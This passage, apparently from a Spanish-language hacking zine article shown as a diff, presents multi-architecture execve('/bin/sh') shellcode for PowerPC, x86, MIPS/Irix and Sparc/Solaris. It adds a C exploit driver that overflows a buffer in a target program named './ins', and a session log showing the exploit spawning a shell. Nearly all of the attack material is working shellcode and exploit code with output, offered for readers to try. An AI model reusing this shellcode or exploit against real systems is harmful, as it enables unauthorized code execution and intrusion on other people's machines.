+	"\x7e\xa8\x02\xa6"	/* mflr		r21			*/
+	"\x3a\xc0\x01\xff"	/* lil		r22,0x1ff		*/
+	"\x3a\xf6\xfe\x2d"	/* cal		r23,-467(r22)		*/
+	"\x7e\xb5\xba\x14"	/* cax		r21,r21,r23		*/
+	"\x7e\xa9\x03\xa6"	/* mtctr	r21			*/
+	"\x4e\x80\x04\x20"	/* bctr					*/
+
+	"\x04\x82\x53\x71"
+	"\x87\xa0\x89\xfc"
+	"\x69\x68\x67\x65"
+
+	"\x4c\xc6\x33\x42"	/* crorc	cr6,cr6,cr6		*/
+	"\x44\xff\xff\x02"	/* svca		0x0			*/
+	"\x3a\xb5\xff\xf8"	/* cal		r21,-8(r21)		*/
+
+	"\x7c\xa5\x2a\x79"	/* xor.		r5,r5,r5		*/
+	"\x40\x82\xff\xfd"	/* bnel		<shellcode>		*/
+	"\x7f\xe8\x02\xa6"	/* mflr		r31			*/
+	"\x3b\xff\x01\x20"	/* cal		r31,0x120(r31)		*/
+	"\x38\x7f\xff\x08"	/* cal		r3,-248(r31)		*/
+	"\x38\x9f\xff\x10"	/* cal		r4,-240(r31)		*/
+	"\x90\x7f\xff\x10"	/* st		r3,-240(r31)		*/
+	"\x90\xbf\xff\x14"	/* st		r5,-236(r31)		*/
+	"\x88\x55\xff\xf4"	/* lbz		r2,-12(r21)		*/
+	"\x98\xbf\xff\x0f"	/* stb		r5,-241(r31)		*/
+	"\x7e\xa9\x03\xa6"	/* mtctr	r21			*/
+	"\x4e\x80\x04\x20"	/* bctr					*/
+	"/bin/sh"
+
+
+	/* x86 BSD/Linux execve() por mi */
+        "\xeb\x29"		/* jmp					*/
+        "\x5e"			/* pop		%esi			*/
+        "\x31\xc0"		/* xor		%eax, %eax		*/
+        "\x50"			/* push		%eax 			*/
+        "\x88\x46\x07"		/* mov		%al,0x7(%esi) 		*/
+        "\x89\x46\x0c"		/* mov		%eax,0xc(%esi)		*/
+        "\x89\x76\x08"		/* mov		%esi,0x8(%esi)		*/
+        "\x8d\x5e\x08"		/* lea		0x8(%esi),%ebx		*/
+        "\x53"			/* push		%ebx			*/
+        "\x56"			/* push		%esi			*/
+        "\x50"			/* push		%eax			*/
+
+        /* configurar registros para linux */
+        "\x8d\x4e\x08"		/* lea		0x8(%esi),%ecx		*/
+        "\x8d\x56\x08"		/* lea		0x8(%esi),%edx		*/
+        "\x89\xf3"		/* mov		%esi, %ebx		*/
+
+        /* distinguir entre BSD & Linux */
+        "\x8c\xe0"		/* movl		%fs, %eax		*/
+        "\x21\xc0"		/* andl		%eax, %eax		*/
+        "\x74\x04"		/* jz		+4			*/
+        "\xb0\x3b"		/* mov		$0x3b, %al		*/
+        "\xeb\x02"		/* jmp		+2			*/
+        "\xb0\x0b"		/* mov		$0xb, %al		*/
+
+        "\xcd\x80"		/* int		$0x80			*/
+
+        "\xe8\xd2\xff\xff\xff"	/* call					*/
+        "\x2f\x62\x69\x6e"	/* /bin					*/
+	"\x2f\x73\x68"		/* /sh					*/
+
+
+	/*
+	 * rellenar los shellcodes de MIPS/Irix & Sparc/Solaris
+	 * jumps de > 0x0101 bytes son llevados a cabo en ambas 
+	 * plataformas para evitar bytes NULL en las instrucciones jump
+	 */
+	"2359595912811011811145128130124118116118121114127231291301241171"
+	"2911813245571341291181211101231241181291101234512913012411712911"
+	"8132455712712412112411245123118120128451291301241171291181324512"
+	"9128118133114451141004559113130110111451141171294511512445134129"
+	"1301101141112311411712945571171121291181321284511411712945113123"
+	"1104512312412712911211412111445114117129451151244511312112712413"
+	"2451141171294559595913212412345113121127124132451271301244512811"
+	"8451281181179797117118128451181284512413012745132124127121113451"
+	"2312413259595945129117114451321241271211134512411545129117114451"
+	"1412111411212912712412345110123113451291171144512813211812911211"
+	"7574512911711423111114110130129134451241154512911711445111110130"
+	"1135945100114451141331181281294513211812911712413012945128120118"
+	"1234511212412112412757451321181291171241301294512311012911812412"
+	"31101211181291345745132118"
+
+
+        /* 68 byte MIPS/Irix PIC execve shellcode. -scut/teso		*/
+        "\xaf\xa0\xff\xfc"      /* sw           $zero, -4($sp)          */
+        "\x24\x06\x73\x50"      /* li           $a2, 0x7350             */
+        "\x04\xd0\xff\xff"      /* bltzal       $a2, dpatch             */
+        "\x8f\xa6\xff\xfc"      /* lw           $a2, -4($sp)            */
+
+        /* a2 = (char **) envp = NULL */
+        "\x24\x0f\xff\xcb"      /* li           $t7, -53                */
+        "\x01\xe0\x78\x27"      /* nor          $t7, $t7, $zero         */
+        "\x03\xef\xf8\x21"      /* addu         $ra, $ra, $t7           */
+
+        /* a0 = (char *) pathname */
+        "\x23\xe4\xff\xf8"      /* addi         $a0, $ra, -8            */
+
+        /* arreglar el byte tonto 0x42 en la ruta al shell */
+        "\x8f\xed\xff\xfc"      /* lw           $t5, -4($ra)            */
+        "\x25\xad\xff\xbe"      /* addiu        $t5, $t5, -66           */
+        "\xaf\xed\xff\xfc"      /* sw           $t5, -4($ra)            */
+
+        /* a1 = (char **) argv */
+        "\xaf\xa4\xff\xf8"      /* sw           $a0, -8($sp)            */
+        "\x27\xa5\xff\xf8"      /* addiu        $a1, $sp, -8            */
+
+        "\x24\x02\x04\x23"      /* li           $v0, 1059 (SYS_execve)  */
+        "\x01\x01\x01\x0c"      /* syscall                              */
+        "\x2f\x62\x69\x6e"      /* .ascii       "/bin"                  */
+        "\x2f\x73\x68\x42"      /* .ascii       "/sh", .byte 0xdummy    */
+
+
+        /* Sparc Solaris execve() por un autor desconocido */
+        "\x2d\x0b\xd8\x9a"	/* sethi	$0xbd89a, %l6           */
+        "\xac\x15\xa1\x6e"	/* or		%l6, 0x16e, %l6         */
+        "\x2f\x0b\xdc\xda"	/* sethi	$0xbdcda, %l7           */
+        "\x90\x0b\x80\x0e"	/* and		%sp, %sp, %o0           */
+        "\x92\x03\xa0\x08"	/* add		%sp, 8, %o1             */
+        "\x94\x1a\x80\x0a"	/* xor		%o2, %o2, %o2           */
+        "\x9c\x03\xa0\x10"	/* add		%sp, 0x10, %sp          */
+        "\xec\x3b\xbf\xf0"	/* std		%l6, [%sp - 0x10]       */
+        "\xdc\x23\xbf\xf8"	/* st		%sp, [%sp - 0x08]       */
+        "\xc0\x23\xbf\xfc"	/* st		%g0, [%sp - 0x04]       */
+        "\x82\x10\x20\x3b"	/* mov		$0x3b, %g1              */
+        "\x91\xd0\x20\x08"	/* ta		8                       */
+;
+
+int main(int argc, char *argv[])
+{
+   char buffer[DEFAULT_LEN];
+   char *args[] = {"./ins", buffer, NULL};
+   unsigned int len;
+   int i = 0;
+
+   if (argc < 2)
+      exit(1);
+   
+   if ((len = atoi(argv[1])) > 1064)
+      exit(1);   
+
+   memset(buffer, '/', len);
+
+   while (i < strlen(sc)) {
+      buffer[len++] = sc[i++];
+   }
+
+   execve(*args, args, NULL);
+
+   fprintf(stderr, "\nError: execve(): %s\n", strerror(errno));
+
+   return 0; // Esto no deberia ocurrir
+}
+
+[-----]
+
+blackngel@mac:~$ ./exins 512
+PTRS = [ 0xbfffe820 ]
+INSTRING = [ 0xbfffe81c ]
+
+blackngel@mac:~$ ./exins 1028
+PTRS = [ 0xbfffe620 ]
+INSTRING = [ 0xbfffe61c ]
+
+sh-3.2$ id
+uid=1000(blackngel) gid=1000(blackngel) groups=4(adm),20(dialout),24(cdrom),
+25(floppy),29(audio),30(dip),33(www-data),44(video),46(plugdev),104(scanner),
+108(lpadmin),110(admin),115(netdev),117(powerdev),1000(blackngel),1001(compiler)
+sh-3.2$ exit
+exit
+
+blackngel@mac:~$ 
+
+Tu mismo puedes probar si el exploit se ejecuta del modo correcto en el resto
+de arquitecturas. Asi puede que comience a interesarte mucho mas el tema...
+
+
+ [1] Architecture Spanning Shellcode by eugene
+     http://www.phrack.org/issues.html?issue=57&id=17#article
+
+
+Un abrazo!
+balckngel
+
+
+*EOF*
